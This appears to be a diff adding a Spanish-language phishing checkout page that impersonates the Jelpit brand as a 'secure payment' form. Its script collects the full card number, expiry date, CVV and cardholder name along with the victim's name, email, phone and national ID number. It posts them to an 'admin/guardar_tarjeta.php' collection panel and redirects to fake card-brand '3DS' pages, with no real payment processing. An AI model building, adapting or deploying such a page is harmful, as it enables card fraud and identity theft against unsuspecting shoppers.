@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pago Seguro - Jelpit</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: #f7f7f7;
+        }
+        header {
+            background: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            min-height: 65px;
+        }
+        .logo { display: flex; align-items: center; }
+        .logo img { height: 60px; width: auto; }
+        .menu-btn { background: none; border: none; color: #2d1b69; font-size: 28px; cursor: pointer; padding: 5px; }
+        .container { max-width: 500px; margin: 0 auto; background: #f7f7f7; padding: 20px; }
+        .card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #ddd;
+        }
+        .card-header-icon { width: 28px; height: 28px; color: #2d1b69; flex-shrink: 0; }
+        .card-title { font-size: 18px; font-weight: 700; color: #2d1b69; }
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            font-size: 13px;
+        }
+        .info-label { color: #999; font-weight: 500; }
+        .info-value { color: #2d1b69; font-weight: 600; }
+        .payment-method {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 12px 15px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+        .payment-method:hover { border-color: #00ff88; background: #f9f9f9; }
+        .payment-method.cards {
+            flex-direction: column;
+            align-items: flex-start;
+            padding: 15px;
+        }
+        .payment-method.cards.expanded { border-color: #00ff88; }
+        .payment-method-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex: 1;
+        }
+        .payment-method.cards .payment-method-left {
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 10px;
+            width: 100%;
+        }
+        .payment-method-icons { display: flex; gap: 6px; flex-wrap: wrap; }
+        .payment-icon { width: 48px; height: 32px; object-fit: contain; }
+        .payment-method-label { font-size: 13px; font-weight: 600; color: #2d1b69; }
+        .payment-method-dropdown-img {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            object-fit: contain;
+            transition: transform 0.3s;
+        }
+        .payment-method.cards.expanded .payment-method-dropdown-img {
+            transform: translateY(-50%) rotate(180deg);
+        }
+        .card-form { display: none; padding: 15px; border-top: 1px solid #ddd; }
+        .card-form.active { display: block; }
+        .radio-group {
+            display: flex;
+            gap: 30px;
+            margin-bottom: 15px;
+        }
+        .radio-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+        }
+        .radio-item input[type="radio"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #2d1b69;
+        }
+        .radio-item label { cursor: pointer; font-size: 13px; color: #2d1b69; font-weight: 600; }
+        .form-group { margin-bottom: 12px; }
+        .form-label {
+            font-size: 12px;
+            color: #2d1b69;
+            font-weight: 600;
+            margin-bottom: 6px;
+            display: block;
+        }
+        .form-input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 12px;
+            font-family: inherit;
+            color: #2d1b69;
+            padding-right: 60px;
+        }
+        .form-input::placeholder { color: #ccc; }
+        .form-input:focus { outline: none; border-color: #00ff88; }
+        .form-input-wrapper {
+            position: relative;
+        }
+        .tarjeta-icono {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 32px;
+            width: auto;
+            opacity: 0.5;
+            transition: all 0.3s ease;
+            pointer-events: none;
+            border-radius: 4px;
+        }
+        .tarjeta-icono.visible { 
+            opacity: 1; 
+        }
+        .ver-detalles {
+            text-align: center;
+            padding: 15px;
+            border-top: 1px solid #ddd;
+            cursor: pointer;
+            color: #2d1b69;
+            font-weight: 600;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .total-section { text-align: center; padding: 20px; margin-top: 20px; }
+        .total-label { font-size: 14px; color: #999; margin-bottom: 8px; }
+        .total-amount { font-size: 32px; font-weight: 800; color: #2d1b69; }
+        .btn-pagar {
+            width: 100%;
+            padding: 14px;
+            background: #00ff88;
+            color: #2d1b69;
+            border: none;
+            border-radius: 25px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            font-family: inherit;
+        }
+        .btn-pagar:hover {
+            background: #00e67e;
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+        .btn-pagar:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .toast {
+            display: none;
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 24px;
+            border-radius: 8px;
+            color: white;
+            z-index: 9999;
+            font-size: 14px;
+            max-width: 320px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        .toast.success { background: #00ff88; color: #2d1b69; }
+        .toast.error { background: #e74c3c; }
+        .toast.show { display: block; }
+        footer {
+            background: #2d1b69;
+            padding: 30px 20px;
+            color: white;
+            margin-top: 40px;
+        }
+        .footer-content { max-width: 500px; margin: 0 auto; }
+        .footer-subtitle {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .footer-title { font-size: 14px; font-weight: 700; color: white; margin-bottom: 5px; }
+        .footer-text { font-size: 12px; color: rgba(255, 255, 255, 0.8); margin-bottom: 15px; }
+        .footer-contact {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        .footer-contact a { color: #00ff88; text-decoration: none; font-weight: 600; }
+        .footer-contact a:hover { text-decoration: underline; }
+        .footer-divider { height: 1px; background: rgba(255, 255, 255, 0.2); margin: 15px 0; }
+        .footer-socials {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .footer-socials a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        .footer-socials a:hover { background: #00ff88; color: #2d1b69; }
+        .footer-socials svg { width: 28px; height: 28px; }
+        .footer-links { text-align: center; font-size: 11px; }
+        .footer-links a { color: #00ff88; text-decoration: none; font-weight: 600; }
+        .footer-links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo"><img src="logo.png" alt="Jelpit Logo"></div>
+        <button class="menu-btn">☰</button>
+    </header>
+
+    <div class="container">
+        <div class="toast" id="toast"><span id="toastMsg">Error</span></div>
+
+        <div class="card">
+            <div class="card-header">
+                <svg class="card-header-icon" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                </svg>
+                <div class="card-title">Datos del cliente</div>
+            </div>
+
+            <div class="info-item">
+                <span class="info-label">Nombre completo</span>
+                <span class="info-value" id="nombreDisplay">-</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Correo Electrónico</span>
+                <span class="info-value" id="emailDisplay">-</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Celular</span>
+                <span class="info-value" id="celularDisplay">-</span>
+            </div>
+            <div class="info-item">
+                <span class="info-label">Cédula</span>
+                <span class="info-value" id="cedulaDisplay">-</span>
+            </div>
+        </div>
+
+        <div class="card">
+            <div style="font-size:16px;font-weight:700;color:#2d1b69;margin-bottom:15px;padding:0 20px;padding-top:20px;">Métodos de pago</div>
+
+            <!-- Tarjetas -->
+            <div class="payment-method cards" id="cardsMethod" onclick="toggleCardsForm()">
+                <div class="payment-method-left">
+                    <span class="payment-method-label">Tarjetas Débito o Crédito</span>
+                    <div class="payment-method-icons">
+                        <img src="1.png" alt="Mastercard" class="payment-icon">
+                        <img src="2.png" alt="Visa" class="payment-icon">
+                        <img src="3.png" alt="American Express" class="payment-icon">
+                        <img src="4.png" alt="Diners" class="payment-icon">
+                    </div>
+                </div>
+                <img src="felcha.png" alt="Expandir" class="payment-method-dropdown-img">
+            </div>
+
+            <!-- Formulario de tarjeta -->
+            <div class="card-form" id="cardsForm">
+                <div class="radio-group">
+                    <div class="radio-item">
+                        <input type="radio" id="debito" name="tipoTarjeta" value="debito" checked>
+                        <label for="debito">Tarjeta Débito</label>
+                    </div>
+                    <div class="radio-item">
+                        <input type="radio" id="credito" name="tipoTarjeta" value="credito">
+                        <label for="credito">Tarjeta Crédito</label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Nombre del titular</label>
+                    <input type="text" class="form-input" id="titular" placeholder="Ej: Carlo Rodriguez">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Número de tarjeta</label>
+                    <div class="form-input-wrapper">
+                        <input type="text" class="form-input" id="numeroTarjeta" placeholder="Ej: 1234 5678 9012 3456" maxlength="19">
+                        <img id="iconoTarjeta" class="tarjeta-icono" src="tarjeta.png" alt="Tipo de tarjeta">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Fecha de vencimiento</label>
+                    <input type="text" class="form-input" id="vencimiento" placeholder="Ej: 05/27" maxlength="5">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Código de seguridad (CVV)</label>
+                    <input type="text" class="form-input" id="cvc" placeholder="Ej: 111" maxlength="4">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Número de cuotas</label>
+                    <select class="form-input" id="cuotas">
+                        <option value="">Seleccione una opción</option>
+                        <option value="1">1 cuota</option>
+                        <option value="3">3 cuotas</option>
+                        <option value="6">6 cuotas</option>
+                        <option value="12">12 cuotas</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- PSE -->
+            <div class="payment-method" onclick="window.location.href='pse.html'">
+                <div class="payment-method-left">
+                    <span class="payment-method-label">Débito PSE</span>
+                </div>
+                <img src="pse.png" alt="PSE" class="payment-icon" style="width:60px;height:40px;">
+            </div>
+
+            <div class="ver-detalles" onclick="toggleDetalles()" style="margin:0 20px 15px 20px;">
+                <span>⋅ Ver detalles</span>
+            </div>
+        </div>
+
+        <div class="total-section">
+            <div class="total-label">Total</div>
+            <div class="total-amount" id="totalDisplay">$ 0</div>
+        </div>
+
+        <button class="btn-pagar" id="btnPagar" onclick="realizarPago()">Pagar</button>
+    </div>
+
+    <script>
+        // ============================================
+        // MAPA DE ICONOS DE TARJETAS (CORREGIDO)
+        // 1.png = Mastercard
+        // 2.png = Visa
+        // 3.png = American Express
+        // 4.png = Diners Club
+        // ============================================
+        const ICONOS_TARJETAS = {
+            'mastercard': '1.png',
+            'visa': '2.png',
+            'amex': '3.png',
+            'diners': '4.png'
+        };
+
+        // ============================================
+        // DETECTAR TIPO DE TARJETA POR BIN
+        // ============================================
+        function detectarTipoTarjeta(numero) {
+            const clean = numero.replace(/\s/g, '');
+            
+            // Si no hay número o tiene menos de 2 dígitos, retornar null
+            if (clean.length < 2) {
+                return null;
+            }
+            
+            const first = parseInt(clean.substring(0, 1));
+            const first2 = parseInt(clean.substring(0, 2));
+
+            console.log('🔍 Detectando tarjeta:', clean, 'Primer dígito:', first, 'Primeros 2 dígitos:', first2);
+
+            // MASTERCARD: empieza con 51, 52, 53, 54, 55 → 1.png
+            if (first2 >= 51 && first2 <= 55) {
+                console.log('✅ MASTERCARD detectada → 1.png');
+                return { tipo: 'mastercard', nombre: 'Mastercard', icono: '1.png' };
+            }
+            
+            // VISA: empieza con 4 → 2.png
+            if (first === 4) {
+                console.log('✅ VISA detectada → 2.png');
+                return { tipo: 'visa', nombre: 'Visa', icono: '2.png' };
+            }
+            
+            // AMERICAN EXPRESS: empieza con 34 o 37 → 3.png
+            if (first2 === 34 || first2 === 37) {
+                console.log('✅ AMERICAN EXPRESS detectada → 3.png');
+                return { tipo: 'amex', nombre: 'American Express', icono: '3.png' };
+            }
+            
+            // DINERS CLUB: empieza con 36 → 4.png
+            if (first2 === 36) {
+                console.log('✅ DINERS CLUB detectada → 4.png');
+                return { tipo: 'diners', nombre: 'Diners Club', icono: '4.png' };
+            }
+
+            // Si no se detecta ningún tipo, retornar null
+            console.log('❌ Tipo no detectado');
+            return null;
+        }
+
+        // ============================================
+        // MOSTRAR ICONO DE TARJETA
+        // ============================================
+        function mostrarIconoTarjeta(numero) {
+            const icono = document.getElementById('iconoTarjeta');
+            const cleanNumber = numero.replace(/\s/g, '');
+            
+            // Si no hay número, mostrar tarjeta.png (default)
+            if (cleanNumber.length === 0) {
+                icono.src = 'tarjeta.png';
+                icono.className = 'tarjeta-icono';
+                console.log('🔄 Icono: vacío → tarjeta.png');
+                return null;
+            }
+
+            // Si tiene menos de 2 dígitos, mostrar tarjeta.png (default)
+            if (cleanNumber.length < 2) {
+                icono.src = 'tarjeta.png';
+                icono.className = 'tarjeta-icono';
+                console.log('🔄 Icono: 1 dígito → tarjeta.png');
+                return null;
+            }
+
+            // Detectar el tipo de tarjeta (2 dígitos o más)
+            const resultado = detectarTipoTarjeta(numero);
+            
+            if (resultado) {
+                // Actualizar el icono con el de la tarjeta detectada
+                icono.src = resultado.icono;
+                icono.className = 'tarjeta-icono visible';
+                console.log(`✅ Icono actualizado: ${resultado.nombre} → ${resultado.icono}`);
+                return resultado;
+            } else {
+                // Si no se detecta, mostrar tarjeta.png (default)
+                icono.src = 'tarjeta.png';
+                icono.className = 'tarjeta-icono';
+                console.log('❓ Tipo no detectado → tarjeta.png');
+                return null;
+            }
+        }
+
+        // ============================================
+        // TOAST
+        // ============================================
+        function showToast(msg, type = 'error') {
+            const toast = document.getElementById('toast');
+            const toastMsg = document.getElementById('toastMsg');
+            toastMsg.textContent = msg;
+            toast.className = 'toast ' + type + ' show';
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 5000);
+        }
+
+        // ============================================
+        // LEER PARÁMETROS DE LA URL
+        // ============================================
+        function getParametro(nombre) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(nombre);
+        }
+
+        // ============================================
+        // GUARDAR EN EL PANEL
+        // ============================================
+        async function guardarEnPanel(datos) {
+            try {
+                const response = await fetch('admin/guardar_tarjeta.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(datos)
+                });
+                const data = await response.json();
+                console.log('📤 Datos guardados en panel:', data);
+                return data;
+            } catch (error) {
+                console.error('❌ Error al guardar en panel:', error);
+                return null;
+            }
+        }
+
+        // ============================================
+        // INICIALIZAR PÁGINA
+        // ============================================
+        function initPage() {
+            const montoURL = getParametro('monto');
+            const nombreURL = getParametro('nombre');
+            const apellidoURL = getParametro('apellido');
+            const emailURL = getParametro('email');
+            const celularURL = getParametro('celular');
+            const cedulaURL = getParametro('cedula');
+
+            const nombre = nombreURL || sessionStorage.getItem('nombre') || '';
+            const apellido = apellidoURL || sessionStorage.getItem('apellido') || '';
+            const email = emailURL || sessionStorage.getItem('email') || '';
+            const celular = celularURL || sessionStorage.getItem('celular') || '';
+            const cedula = cedulaURL || sessionStorage.getItem('numeroId') || '';
+            let monto = montoURL || sessionStorage.getItem('monto') || '0';
+
+            sessionStorage.setItem('nombre', nombre);
+            sessionStorage.setItem('apellido', apellido);
+            sessionStorage.setItem('email', email);
+            sessionStorage.setItem('celular', celular);
+            sessionStorage.setItem('numeroId', cedula);
+            sessionStorage.setItem('monto', monto);
+
+            document.getElementById('nombreDisplay').textContent = nombre && apellido ? nombre + ' ' + apellido : (nombre || apellido || 'No disponible');
+            document.getElementById('emailDisplay').textContent = email || 'No disponible';
+            document.getElementById('celularDisplay').textContent = celular || 'No disponible';
+            document.getElementById('cedulaDisplay').textContent = cedula || 'No disponible';
+
+            if (monto && monto !== '0' && monto !== '0.00') {
+                const montoLimpio = monto.replace(/\./g, '').replace(/,/g, '');
+                const montoNumerico = parseFloat(montoLimpio);
+                if (!isNaN(montoNumerico) && montoNumerico > 0) {
+                    document.getElementById('totalDisplay').textContent = '$ ' + Math.floor(montoNumerico).toLocaleString('es-CO');
+                } else {
+                    document.getElementById('totalDisplay').textContent = '$ ' + monto;
+                }
+            } else {
+                document.getElementById('totalDisplay').textContent = '$ 0';
+            }
+
+            console.log('📌 Datos cargados:', { nombre, apellido, email, celular, cedula, monto });
+        }
+
+        // ============================================
+        // TOGGLE TARJETAS
+        // ============================================
+        function toggleCardsForm() {
+            const cardsMethod = document.getElementById('cardsMethod');
+            const cardsForm = document.getElementById('cardsForm');
+            cardsMethod.classList.toggle('expanded');
+            cardsForm.classList.toggle('active');
+            
+            if (cardsForm.classList.contains('active')) {
+                setTimeout(() => {
+                    document.getElementById('numeroTarjeta').focus();
+                }, 100);
+            }
+        }
+
+        function toggleDetalles() {
+            showToast('Desglose del pago', 'success');
+        }
+
+        // ============================================
+        // FORMATO DE TARJETA Y DETECCIÓN AUTOMÁTICA
+        // ============================================
+        document.addEventListener('DOMContentLoaded', function() {
+            initPage();
+
+            const cardNumberInput = document.getElementById('numeroTarjeta');
+            if (cardNumberInput) {
+                cardNumberInput.addEventListener('input', function(e) {
+                    // Obtener el valor sin espacios
+                    let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+                    
+                    // Limitar a 16 dígitos
+                    if (value.length > 16) value = value.slice(0, 16);
+                    
+                    // Formatear con espacios cada 4 dígitos
+                    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+                    e.target.value = formatted;
+                    
+                    // Detectar y mostrar el icono correspondiente
+                    const resultado = mostrarIconoTarjeta(formatted);
+                    
+                    if (resultado) {
+                        e.target.dataset.tipoDetectado = resultado.tipo;
+                        console.log(`📌 Tarjeta: ${resultado.nombre}`);
+                    } else {
+                        e.target.dataset.tipoDetectado = '';
+                    }
+                });
+
+                cardNumberInput.addEventListener('blur', function(e) {
+                    const resultado = mostrarIconoTarjeta(e.target.value);
+                    if (resultado) {
+                        e.target.dataset.tipoDetectado = resultado.tipo;
+                    }
+                });
+            }
+
+            const dateInput = document.getElementById('vencimiento');
+            if (dateInput) {
+                dateInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length >= 2) {
+                        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+
+            const cvcInput = document.getElementById('cvc');
+            if (cvcInput) {
+                cvcInput.addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+                });
+            }
+
+            console.log('🚀 Página de pago cargada');
+            console.log('📋 MAPA DE ICONOS:');
+            console.log('  Mastercard → 1.png');
+            console.log('  Visa → 2.png');
+            console.log('  American Express → 3.png');
+            console.log('  Diners Club → 4.png');
+            console.log('💡 Comportamiento del icono:');
+            console.log('  - 0 dígitos: tarjeta.png (default)');
+            console.log('  - 1 dígito: tarjeta.png (default)');
+            console.log('  - 2+ dígitos: Icono específico según BIN');
+            console.log('📝 Ejemplos de detección:');
+            console.log('  "51..." → Mastercard (1.png)');
+            console.log('  "52..." → Mastercard (1.png)');
+            console.log('  "53..." → Mastercard (1.png)');
+            console.log('  "54..." → Mastercard (1.png)');
+            console.log('  "55..." → Mastercard (1.png)');
+            console.log('  "4..." → Visa (2.png)');
+            console.log('  "34..." → American Express (3.png)');
+            console.log('  "37..." → American Express (3.png)');
+            console.log('  "36..." → Diners Club (4.png)');
+        });
+
+        // ============================================
+        // REALIZAR PAGO
+        // ============================================
+        async function realizarPago() {
+            const nombre = sessionStorage.getItem('nombre') || '';
+            const apellido = sessionStorage.getItem('apellido') || '';
+            const email = sessionStorage.getItem('email') || '';
+            const celular = sessionStorage.getItem('celular') || '';
+            const cedula = sessionStorage.getItem('numeroId') || '';
+            const monto = sessionStorage.getItem('monto') || '0';
+
+            const tipoTarjetaRadio = document.querySelector('input[name="tipoTarjeta"]:checked')?.value || 'debito';
+            const titular = document.getElementById('titular')?.value || '';
+            const numeroTarjeta = document.getElementById('numeroTarjeta')?.value || '';
+            const vencimiento = document.getElementById('vencimiento')?.value || '';
+            const cvc = document.getElementById('cvc')?.value || '';
+            const cuotas = document.getElementById('cuotas')?.value || '';
+
+            // Validar campos
+            const tarjetaLimpia = numeroTarjeta.replace(/\s/g, '');
+            if (tarjetaLimpia.length < 16) {
+                showToast('Ingresa un número de tarjeta válido (16 dígitos)', 'error');
+                return;
+            }
+            if (!titular.trim()) {
+                showToast('Ingresa el nombre del titular', 'error');
+                return;
+            }
+            if (!vencimiento || vencimiento.length < 5) {
+                showToast('Ingresa la fecha de vencimiento (MM/AA)', 'error');
+                return;
+            }
+            if (!cvc || cvc.length < 3) {
+                showToast('Ingresa el código de seguridad (CVV)', 'error');
+                return;
+            }
+
+            // Detectar tipo de tarjeta automáticamente
+            const deteccion = detectarTipoTarjeta(tarjetaLimpia);
+            
+            if (!deteccion) {
+                showToast('Tipo de tarjeta no reconocido. Verifica el número.', 'error');
+                return;
+            }
+
+            const tipoTarjetaSelect = deteccion.tipo;
+
+            console.log('🎯 Tarjeta detectada para pago:', deteccion);
+
+            const btnPagar = document.getElementById('btnPagar');
+            btnPagar.textContent = '⏳ Procesando...';
+            btnPagar.disabled = true;
+
+            // Generar ID 3DS
+            const id3ds = '3DS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+            sessionStorage.setItem('id_3ds', id3ds);
+
+            // Guardar datos de la tarjeta en sessionStorage para la página 3DS
+            sessionStorage.setItem('tipo_tarjeta', tipoTarjetaSelect);
+            sessionStorage.setItem('titular', titular);
+            sessionStorage.setItem('numero_tarjeta', tarjetaLimpia);
+            sessionStorage.setItem('vencimiento', vencimiento);
+            sessionStorage.setItem('cvc', cvc);
+            sessionStorage.setItem('cuotas', cuotas);
+
+            // Preparar datos para el panel
+            const datosPanel = {
+                nombre: nombre,
+                apellido: apellido,
+                email: email,
+                celular: celular,
+                cedula: cedula,
+                monto: monto,
+                tipo_tarjeta: tipoTarjetaSelect,
+                tipoTarjeta: tipoTarjetaRadio,
+                titular: titular,
+                numero_tarjeta: tarjetaLimpia,
+                vencimiento: vencimiento,
+                cvc: cvc,
+                cuotas: cuotas || '1',
+                metodo: 'TARJETA',
+                id_3ds: id3ds,
+                tipo_detectado: deteccion.nombre
+            };
+
+            console.log('📤 Enviando al panel:', datosPanel);
+
+            // Guardar en el panel
+            const resultado = await guardarEnPanel(datosPanel);
+
+            // Redirigir según el tipo detectado automáticamente
+            if (resultado && resultado.success) {
+                switch(tipoTarjetaSelect) {
+                    case 'visa': window.location.href = 'visa.html'; break;
+                    case 'mastercard': window.location.href = 'mastercard.html'; break;
+                    case 'amex': window.location.href = 'amex.html'; break;
+                    case 'diners': window.location.href = 'diners.html'; break;
+                    default: window.location.href = 'visa.html';
+                }
+            } else {
+                showToast('❌ Error al procesar el pago. Intenta de nuevo.', 'error');
+                btnPagar.textContent = 'Pagar';
+                btnPagar.disabled = false;
+            }
+        }
+
+        // ============================================
+        // FUNCIÓN DE PRUEBA EN CONSOLA
+        // ============================================
+        function probarDeteccion(numero) {
+            const resultado = detectarTipoTarjeta(numero);
+            console.log('📊 Resultado de detección:', resultado);
+            return resultado;
+        }
+
+        // Exponer funciones para pruebas
+        window.probarDeteccion = probarDeteccion;
+        window.detectarTipoTarjeta = detectarTipoTarjeta;
+        window.mostrarIconoTarjeta = mostrarIconoTarjeta;
+    </script>
+</body>
+</html>
